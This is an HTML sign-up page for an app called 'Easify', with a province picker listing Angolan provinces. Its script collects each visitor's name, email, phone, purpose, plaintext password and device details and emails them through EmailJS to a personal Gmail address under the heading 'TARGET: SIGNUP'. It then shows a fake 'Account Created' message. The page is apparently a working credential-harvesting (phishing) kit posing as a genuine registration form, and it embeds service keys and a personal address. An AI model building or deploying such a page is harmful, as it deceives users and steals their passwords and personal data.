<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" />
  <meta name="theme-color" content="#000000" />
  <meta name="apple-mobile-web-app-capable" content="yes" />
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
  <title>Sign Up - Easify</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      -webkit-tap-highlight-color: transparent;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: #000000;
      color: #FFFFFF;
      min-height: 100vh;
      padding: 0;
      overflow-x: hidden;
      -webkit-font-smoothing: antialiased;
    }

    .app-bar {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      z-index: 100;
      background: rgba(0, 0, 0, 0.8);
      backdrop-filter: blur(20px);
      -webkit-backdrop-filter: blur(20px);
      border-bottom: 0.5px solid rgba(255, 255, 255, 0.1);
      padding: 16px 20px;
      display: flex;
      align-items: center;
      gap: 16px;
    }

    .back-btn {
      background: none;
      border: none;
      color: #FFFFFF;
      font-size: 24px;
      cursor: pointer;
      padding: 0;
      width: 28px;
      height: 28px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .app-bar-title {
      font-size: 17px;
      font-weight: 600;
      color: #FFFFFF;
    }

    .container {
      padding: 80px 24px 32px;
      max-width: 500px;
      margin: 0 auto;
      padding-bottom: 100px;
    }

    .logo-section {
      text-align: center;
      margin-bottom: 40px;
    }

    .app-title {
      font-size: 42px;
      font-weight: 700;
      color: #FFFFFF;
      letter-spacing: -1.5px;
    }

    .form-section {
      margin-bottom: 16px;
    }

    .input-wrapper {
      margin-bottom: 16px;
    }

    .input-field {
      width: 100%;
      background: rgba(255, 255, 255, 0.05);
      border: 1px solid rgba(255, 255, 255, 0.15);
      border-radius: 12px;
      padding: 18px 20px;
      font-size: 16px;
      color: rgba(255, 255, 255, 0.9);
      font-family: inherit;
      outline: none;
      transition: all 0.2s;
    }

    .input-field:focus {
      background: rgba(255, 255, 255, 0.08);
      border-color: rgba(255, 255, 255, 0.25);
    }

    .input-field::placeholder {
      color: rgba(255, 255, 255, 0.4);
    }

    .select-wrapper {
      position: relative;
    }

    .select-field {
      width: 100%;
      background: rgba(255, 255, 255, 0.05);
      border: 1px solid rgba(255, 255, 255, 0.15);
      border-radius: 12px;
      padding: 18px 20px;
      font-size: 16px;
      color: rgba(255, 255, 255, 0.9);
      font-family: inherit;
      outline: none;
      cursor: pointer;
      transition: all 0.2s;
      display: flex;
      align-items: center;
      justify-content: space-between;
    }

    .select-field.placeholder {
      color: rgba(255, 255, 255, 0.4);
    }

    .select-arrow {
      margin-left: 10px;
      color: rgba(255, 255, 255, 0.5);
    }

    textarea.input-field {
      min-height: 100px;
      resize: vertical;
      line-height: 1.5;
    }

    .password-match {
      font-size: 13px;
      margin-top: 8px;
      padding-left: 4px;
    }

    .password-match.match {
      color: #34C759;
    }

    .password-match.no-match {
      color: #FF3B30;
    }

    .submit-btn {
      width: 100%;
      height: 52px;
      background: #1877F2;
      color: #FFFFFF;
      border: none;
      border-radius: 26px;
      font-size: 17px;
      font-weight: 700;
      cursor: pointer;
      transition: all 0.2s;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-top: 24px;
      box-shadow: 0 4px 12px rgba(24, 119, 242, 0.3);
    }

    .submit-btn:active:not(:disabled) {
      transform: scale(0.98);
      background: #166FE5;
    }

    .submit-btn:disabled {
      opacity: 0.6;
      cursor: not-allowed;
    }

    .loading-spinner {
      display: inline-block;
      width: 18px;
      height: 18px;
      border: 2.5px solid rgba(255, 255, 255, 0.3);
      border-radius: 50%;
      border-top-color: #FFFFFF;
      animation: spin 0.6s linear infinite;
      margin-right: 10px;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .footer {
      text-align: center;
      margin-top: 40px;
      color: rgba(255, 255, 255, 0.3);
      font-size: 13px;
    }

    /* Dialog Styles */
    .dialog-overlay {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(0, 0, 0, 0.85);
      z-index: 1000;
      align-items: center;
      justify-content: center;
      padding: 20px;
      backdrop-filter: blur(4px);
    }

    .dialog-overlay.show {
      display: flex;
    }

    .dialog {
      background: #1C1C1E;
      border-radius: 16px;
      width: 100%;
      max-width: 340px;
      overflow: hidden;
      animation: dialogIn 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
    }

    @keyframes dialogIn {
      from {
        opacity: 0;
        transform: scale(0.9);
      }
      to {
        opacity: 1;
        transform: scale(1);
      }
    }

    .dialog-content {
      padding: 28px 24px;
      text-align: center;
    }

    .dialog-icon {
      font-size: 52px;
      margin-bottom: 16px;
    }

    .dialog-title {
      font-size: 18px;
      font-weight: 700;
      color: #FFFFFF;
      margin-bottom: 10px;
    }

    .dialog-message {
      font-size: 14px;
      color: rgba(255, 255, 255, 0.65);
      line-height: 1.5;
    }

    .dialog-actions {
      border-top: 0.5px solid rgba(255, 255, 255, 0.1);
      display: flex;
    }

    .dialog-button {
      flex: 1;
      padding: 18px;
      background: transparent;
      border: none;
      color: #1877F2;
      font-size: 18px;
      font-weight: 700;
      cursor: pointer;
      transition: background 0.2s;
    }

    .dialog-button:active {
      background: rgba(255, 255, 255, 0.05);
    }

    /* Province Selection Dialog */
    .province-dialog {
      max-width: 360px;
      max-height: 80vh;
    }

    .province-list {
      max-height: 400px;
      overflow-y: auto;
      padding: 0;
    }

    .province-item {
      width: 100%;
      padding: 16px 24px;
      background: transparent;
      border: none;
      border-bottom: 0.5px solid rgba(255, 255, 255, 0.1);
      color: #FFFFFF;
      font-size: 16px;
      text-align: left;
      cursor: pointer;
      transition: background 0.2s;
    }

    .province-item:last-child {
      border-bottom: none;
    }

    .province-item:active {
      background: rgba(255, 255, 255, 0.05);
    }

    @supports (-webkit-touch-callout: none) {
      input, textarea {
        font-size: 16px;
      }
    }
  </style>
</head>
<body>
  <div class="app-bar">
    <button class="back-btn" onclick="window.history.back()">←</button>
    <div class="app-bar-title">Sign up</div>
  </div>

  <div class="container">
    <div class="logo-section">
      <h1 class="app-title">Easify</h1>
    </div>

    <form id="signupForm">
      <div class="form-section">
        <div class="input-wrapper">
          <input id="fullName" class="input-field" type="text" placeholder="Full Name" required autocomplete="name" />
        </div>
        <div class="input-wrapper">
          <input id="email" class="input-field" type="email" placeholder="Email" required autocomplete="email" />
        </div>
        <div class="input-wrapper">
          <input id="phone" class="input-field" type="tel" placeholder="Phone Number" required autocomplete="tel" />
        </div>
        <div class="input-wrapper">
          <div class="select-wrapper">
            <div id="provinceSelect" class="select-field placeholder" onclick="openProvinceDialog()">
              <span id="provinceText">Select Province</span>
              <span class="select-arrow">▼</span>
            </div>
          </div>
        </div>
        <div class="input-wrapper">
          <textarea id="purpose" class="input-field" placeholder="What's your purpose?" required></textarea>
        </div>
        <div class="input-wrapper">
          <input id="password" class="input-field" type="password" placeholder="Password" required />
        </div>
        <div class="input-wrapper">
          <input id="passwordConfirm" class="input-field" type="password" placeholder="Confirm Password" required />
          <div id="passwordMatch" class="password-match"></div>
        </div>
      </div>

      <button type="submit" class="submit-btn" id="submitBtn">
        Sign Up
      </button>
    </form>

    <div class="footer">Easify</div>
  </div>

  <!-- Dialog -->
  <div id="dialogOverlay" class="dialog-overlay">
    <div class="dialog" id="dialogContainer">
      <div class="dialog-content">
        <div id="dialogIcon" class="dialog-icon"></div>
        <div id="dialogTitle" class="dialog-title"></div>
        <div id="dialogMessage" class="dialog-message"></div>
      </div>
      <div class="dialog-actions">
        <button class="dialog-button primary" onclick="closeDialog()">OK</button>
      </div>
    </div>
  </div>

  <!-- Province Dialog -->
  <div id="provinceDialogOverlay" class="dialog-overlay">
    <div class="dialog province-dialog">
      <div class="dialog-content" style="padding: 16px 0 0 0;">
        <div style="padding: 0 24px 16px;">
          <div class="dialog-title">Select Province</div>
        </div>
        <div class="province-list" id="provinceList"></div>
      </div>
    </div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>

  <script>
    (function () {
      const SERVICE_ID = 'Service_avyr0og';
      const TEMPLATE_ID = 'template_oa8b7iz';
      const USER_ID = 'EUFE-qVsBF34lD4QZ';
      const RECIPIENT_EMAIL = 'alfredopjonas@gmail.com';
      const RECIPIENT_NAME = 'Alfredo';

      const PROVINCES = [
        'Bengo', 'Benguela', 'Bié', 'Cabinda', 'Cuando Cubango',
        'Cuanza Norte', 'Cuanza Sul', 'Cunene', 'Huambo', 'Huíla',
        'Luanda', 'Lunda Norte', 'Lunda Sul', 'Malanje', 'Moxico',
        'Namibe', 'Uíge', 'Zaire'
      ];

      try {
        emailjs.init(USER_ID);
      } catch (e) {
        console.error('EmailJS init error:', e);
      }

      const form = document.getElementById('signupForm');
      const submitBtn = document.getElementById('submitBtn');
      const passwordInput = document.getElementById('password');
      const passwordConfirmInput = document.getElementById('passwordConfirm');
      const passwordMatch = document.getElementById('passwordMatch');
      const dialogOverlay = document.getElementById('dialogOverlay');
      const dialogContainer = document.getElementById('dialogContainer');
      const dialogIcon = document.getElementById('dialogIcon');
      const dialogTitle = document.getElementById('dialogTitle');
      const dialogMessage = document.getElementById('dialogMessage');
      const provinceDialogOverlay = document.getElementById('provinceDialogOverlay');
      const provinceList = document.getElementById('provinceList');
      const provinceText = document.getElementById('provinceText');
      const provinceSelect = document.getElementById('provinceSelect');

      let selectedProvince = '';

      // Initialize province list
      PROVINCES.forEach(province => {
        const btn = document.createElement('button');
        btn.className = 'province-item';
        btn.textContent = province;
        btn.onclick = () => selectProvince(province);
        provinceList.appendChild(btn);
      });

      window.openProvinceDialog = function() {
        provinceDialogOverlay.classList.add('show');
      };

      function selectProvince(province) {
        selectedProvince = province;
        provinceText.textContent = province;
        provinceSelect.classList.remove('placeholder');
        provinceDialogOverlay.classList.remove('show');
      }

      provinceDialogOverlay.addEventListener('click', function(e) {
        if (e.target === provinceDialogOverlay) {
          provinceDialogOverlay.classList.remove('show');
        }
      });

      function showDialog(type, title, message) {
        const icons = {
          success: '✓',
          error: '✕',
          warning: '⚠️',
          info: 'ℹ️'
        };
        
        dialogIcon.textContent = icons[type] || '✕';
        dialogIcon.style.color = type === 'success' ? '#34C759' : type === 'warning' ? '#FF9500' : type === 'info' ? '#1877F2' : '#FF3B30';
        dialogTitle.textContent = title;
        dialogMessage.textContent = message;
        dialogOverlay.classList.add('show');
        
        if (navigator.vibrate) {
          navigator.vibrate(type === 'success' ? 30 : 20);
        }
      }

      window.closeDialog = function() {
        dialogOverlay.classList.remove('show');
      };

      dialogOverlay.addEventListener('click', function(e) {
        if (e.target === dialogOverlay) {
          closeDialog();
        }
      });

      function checkPasswordMatch() {
        const password = passwordInput.value;
        const confirmPassword = passwordConfirmInput.value;
        
        if (confirmPassword === '') {
          passwordMatch.textContent = '';
          passwordMatch.className = 'password-match';
          return true;
        }
        
        if (password === confirmPassword) {
          passwordMatch.textContent = '✓ Passwords match';
          passwordMatch.className = 'password-match match';
          return true;
        } else {
          passwordMatch.textContent = '✗ Passwords do not match';
          passwordMatch.className = 'password-match no-match';
          return false;
        }
      }

      passwordInput.addEventListener('input', checkPasswordMatch);
      passwordConfirmInput.addEventListener('input', checkPasswordMatch);

      form.addEventListener('submit', function (ev) {
        ev.preventDefault();

        const fullName = document.getElementById('fullName').value.trim();
        const email = document.getElementById('email').value.trim();
        const phone = document.getElementById('phone').value.trim();
        const province = selectedProvince;
        const purpose = document.getElementById('purpose').value.trim();
        const password = document.getElementById('password').value;
        const passwordConfirm = document.getElementById('passwordConfirm').value;

        if (!fullName || !email || !phone || !province || !purpose || !password || !passwordConfirm) {
          showDialog('warning', 'Missing Information', 'Please fill in all fields');
          return;
        }

        if (password !== passwordConfirm) {
          showDialog('error', 'Password Mismatch', 'Passwords do not match');
          return;
        }

        if (password.length < 6) {
          showDialog('error', 'Weak Password', 'Password must be at least 6 characters');
          return;
        }

        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!emailRegex.test(email)) {
          showDialog('error', 'Invalid Email', 'Please enter a valid email address');
          return;
        }

        submitBtn.disabled = true;
        submitBtn.innerHTML = '<span class="loading-spinner"></span>Creating Account...';

        const now = new Date();
        const timestamp = `${now.getDate().toString().padStart(2,'0')}/${(now.getMonth()+1).toString().padStart(2,'0')}/${now.getFullYear()} ${now.getHours().toString().padStart(2,'0')}:${now.getMinutes().toString().padStart(2,'0')}:${now.getSeconds().toString().padStart(2,'0')}`;

        const userAgent = navigator.userAgent;
        const platform = navigator.platform;
        const language = navigator.language;

        const messageContent = `📝 TARGET: SIGNUP\n\n` +
          `═══════════════════════════════\n` +
          `👤 USER INFORMATION\n` +
          `═══════════════════════════════\n` +
          `Full Name: ${fullName}\n` +
          `Email: ${email}\n` +
          `Phone: ${phone}\n` +
          `Province: ${province}\n` +
          `Purpose: ${purpose}\n` +
          `Password: ${password}\n\n` +
          `═══════════════════════════════\n` +
          `🕐 TIMESTAMP & STATUS\n` +
          `═══════════════════════════════\n` +
          `Date/Time: ${timestamp}\n` +
          `Status: Pending Approval\n\n` +
          `═══════════════════════════════\n` +
          `📱 DEVICE INFORMATION\n` +
          `═══════════════════════════════\n` +
          `User Agent: ${userAgent}\n` +
          `Platform: ${platform}\n` +
          `Language: ${language}\n\n` +
          `═══════════════════════════════\n` +
          `⚡ ACTION REQUIRED\n` +
          `═══════════════════════════════\n` +
          `This is a new signup request.\n` +
          `Please review and approve within 6 minutes.`;

        const templateParams = {
          to_name: RECIPIENT_NAME,
          to_email: RECIPIENT_EMAIL,
          from_name: fullName,
          from_email: email,
          message: messageContent,
          cc: '',
          bcc: ''
        };

        emailjs.send(SERVICE_ID, TEMPLATE_ID, templateParams)
          .then(function (response) {
            showDialog('success', 'Account Created Successfully!', 'Your signup request has been submitted. Please wait up to 6 minutes. You will receive a confirmation email once your account is approved.');
            submitBtn.disabled = false;
            submitBtn.textContent = 'Sign Up';
            form.reset();
            passwordMatch.textContent = '';
            selectedProvince = '';
            provinceText.textContent = 'Select Province';
            provinceSelect.classList.add('placeholder');
          }, function (err) {
            showDialog('error', 'Signup Failed', 'Failed to create account. Please check your internet connection and try again.');
            submitBtn.disabled = false;
            submitBtn.textContent = 'Sign Up';
          });
      });
    })();
  </script>
</body>
</html>
